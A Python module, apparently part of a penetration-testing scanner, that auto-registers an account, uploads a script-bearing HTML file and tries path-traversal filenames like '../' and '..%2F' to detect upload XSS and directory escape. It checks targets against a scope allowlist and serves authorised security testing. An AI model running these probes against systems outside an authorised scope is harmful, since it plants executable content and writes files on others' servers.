"""file-upload-probe — detect file upload XSS and path-traversal exploits.

Three classes covered:
  R10 — Upload HTML that the server serves back as text/html, causing
        attacker-controlled scripts to run in any visitor's browser
        (same-origin XSS via stored payload).
  R14 — Path traversal via USERNAME: register `..` or `brie/../..` so the
        server writes uploads to a parent directory.
  R15 — Path traversal via FILENAME: upload with name `../secret.txt` to
        place files at attacker-chosen paths.

Strategy:
1. Register as author so the upload endpoint is accessible.
2. Discover upload endpoint(s) and parse the field name from the form.
3. Upload a marker HTML file with a unique payload.
4. Find the served URL — either parsed from response body or built by
   pattern (e.g. `<instance>/<author>/<filename>`).
5. Fetch it, verify it serves as `text/html` AND the payload reflects.
6. Try malicious filenames for R15.
"""
from __future__ import annotations

import json
import logging
import random
import re
import string
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution

logger = logging.getLogger(__name__)

RUNNER_NAME = "file-upload-probe"
RESULTS_ARTIFACT_NAME = "file-upload-results.json"
DEFAULT_TIMEOUT = 20.0

# Common upload endpoint paths
UPLOAD_ENDPOINTS: tuple[str, ...] = (
    "upload2",        # Gruyere — the form action target
    "upload",
    "uploads",
    "api/upload",
    "files/upload",
    "media/upload",
)

# Filename variants — one safe + path-traversal probes.
FILENAME_VARIANTS: tuple[tuple[str, str], ...] = (
    ("safe_html", "aegispt_probe_{MARK}.html"),
    ("traversal_dot_dot", "../aegispt_traversal_{MARK}.html"),
    ("traversal_url_enc", "..%2Faegispt_traversal_{MARK}.html"),
)

# Marker payload — keep it minimal so we know if reflection is verbatim.
def _make_payload(marker: str) -> str:
    return f"<script>document.title='{marker}'</script><h1>{marker}</h1>"


def _artifact(payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=RESULTS_ARTIFACT_NAME,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _suffix() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _path_root(target: str) -> str:
    parsed = urlparse(target)
    if not parsed.path or parsed.path == "/":
        return target.rstrip("/") + "/"
    if not parsed.path.endswith("/"):
        return target.rsplit("/", 1)[0] + "/"
    return target


def _register_as_author(client: httpx_client.Client, base: str) -> str | None:
    uid = "fu" + _suffix()
    pw = "pw" + _suffix()
    candidates = [
        ("saveprofile", {"action": "new", "uid": uid, "pw": pw, "is_author": "True"}),
        ("saveprofile", {"action": "new", "uid": uid, "pw": pw}),
        ("register", {"username": uid, "password": pw, "is_author": "True"}),
        ("signup", {"username": uid, "password": pw}),
    ]
    for endpoint, params in candidates:
        try:
            resp = client.get(urljoin(base, endpoint), params=params, follow_redirects=False)
        except httpx_client.RequestError:
            continue
        if resp.status_code in (200, 302) and len(client.cookies) > 0:
            return uid
    return None


def _extract_uploaded_url(response_body: str, base: str, uid: str, filename: str) -> str | None:
    """Pull the served URL from the upload response, or build it heuristically."""
    # Pattern 1: explicit "accessible at: <url>"
    m = re.search(r"(?:accessible at|saved to|file at)[:\s]+([\w./%:\-]+)", response_body, re.IGNORECASE)
    if m:
        candidate = m.group(1).strip()
        if candidate.startswith("http"):
            return candidate
        return urljoin(base, candidate.lstrip("/"))
    # Pattern 2: <a href="...{filename}">
    m = re.search(r'href=[\'"]([^\'"]+' + re.escape(filename) + r')[\'"]', response_body)
    if m:
        candidate = m.group(1).strip()
        return urljoin(base, candidate.lstrip("/"))
    # Pattern 3: build by convention — most apps follow <base>/<user>/<filename>
    return urljoin(base, f"{uid}/{filename}")


def execute_file_upload_probe(
    targets: list[str] | list[dict[str, Any]],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    timeout_seconds: float = DEFAULT_TIMEOUT,
) -> RunnerExecution:
    findings_payload: list[dict[str, Any]] = []
    trace: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    web_targets: list[str] = []
    for t in targets:
        if isinstance(t, str):
            if t.strip().lower().startswith(("http://", "https://")):
                web_targets.append(t.strip())
        elif isinstance(t, dict):
            kind = str(t.get("kind") or "").lower()
            value = str(t.get("value") or "").strip()
            if kind == "url" and value:
                web_targets.append(value)
    if not web_targets:
        return RunnerExecution(
            tool=RUNNER_NAME, exit_code=2, stdout=json.dumps({"trace": []}),
            stderr="no web targets supplied",
            metadata={"status": "skip"},
            artifacts=[_artifact({"trace": []})], protected_outputs=[],
        )

    for target in web_targets:
        base = _path_root(target)
        trace_entry: dict[str, Any] = {"target": target, "base": base, "attempts": []}
        seen_xss = False
        seen_traversal = False
        for endpoint in UPLOAD_ENDPOINTS:
            upload_url = urljoin(base, endpoint)
            if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, upload_url):
                continue
            with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
                uid = _register_as_author(client, base)
                if uid is None:
                    continue
                for variant_label, filename_template in FILENAME_VARIANTS:
                    marker = "AEGISFU_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    filename = filename_template.replace("{MARK}", marker)
                    payload = _make_payload(marker)
                    files = {"upload_file": (filename, payload, "text/html")}
                    try:
                        resp = client.post(upload_url, files=files, follow_redirects=False)
                    except httpx_client.RequestError:
                        continue
                    if resp.status_code not in (200, 302):
                        continue
                    served_url = _extract_uploaded_url(resp.text or "", base, uid, filename)
                    if not served_url:
                        continue
                    if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, served_url):
                        trace_entry["attempts"].append({
                            "endpoint": upload_url,
                            "variant": variant_label,
                            "filename": filename,
                            "uploaded_url": served_url,
                            "result": "served_url_out_of_scope",
                        })
                        continue
                    try:
                        get_resp = client.get(served_url, follow_redirects=False)
                    except httpx_client.RequestError:
                        continue
                    ctype = get_resp.headers.get("content-type", "").lower()
                    served_body = (get_resp.text or "")[:8192]
                    payload_reflected = marker in served_body
                    is_html = "html" in ctype or "<script" in served_body.lower()
                    trace_entry["attempts"].append({
                        "endpoint": upload_url,
                        "variant": variant_label,
                        "filename": filename,
                        "uploaded_url": served_url,
                        "served_status": get_resp.status_code,
                        "content_type": ctype,
                        "payload_reflected": payload_reflected,
                    })
                    if get_resp.status_code == 200 and payload_reflected and is_html and not seen_xss:
                        findings_payload.append({
                            "title": f"File Upload XSS — HTML payload served as text/html ({variant_label})",
                            "severity": "critical",
                            "category": "xss",
                            "target_id": served_url,
                            "evidence": {
                                "upload_endpoint": upload_url,
                                "served_url": served_url,
                                "filename": filename,
                                "content_type": ctype,
                                "marker": marker,
                                "payload": payload,
                                "body_excerpt": served_body[:400],
                            },
                        })
                        stderr_lines.append(
                            f"CRITICAL: uploaded HTML at {served_url} (content-type={ctype})"
                        )
                        seen_xss = True
                    # Path traversal — filename outside base path (one finding per target)
                    if (
                        variant_label.startswith("traversal_")
                        and get_resp.status_code == 200
                        and payload_reflected
                        and not seen_traversal
                    ):
                        if uid not in served_url:
                            findings_payload.append({
                                "title": "Path Traversal via Upload Filename — server wrote outside user directory",
                                "severity": "critical",
                                "category": "path-traversal",
                                "target_id": served_url,
                                "evidence": {
                                    "upload_endpoint": upload_url,
                                    "served_url": served_url,
                                    "filename": filename,
                                    "marker": marker,
                                },
                            })
                            stderr_lines.append(
                                f"CRITICAL: path traversal via filename — wrote to {served_url}"
                            )
                            seen_traversal = True
        trace.append(trace_entry)

    result = {
        "trace": trace,
        "findings": findings_payload,
        "attempt_count": sum(len(t["attempts"]) for t in trace),
    }
    if findings_payload:
        stderr_lines.append(f"flagged {len(findings_payload)} file-upload finding(s)")

    return RunnerExecution(
        tool=RUNNER_NAME,
        exit_code=0,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={
            "status": "ok",
            "tool_version": f"{RUNNER_NAME}:v1",
            "findings_count": len(findings_payload),
        },
        artifacts=[_artifact(result)],
        protected_outputs=[],
    )
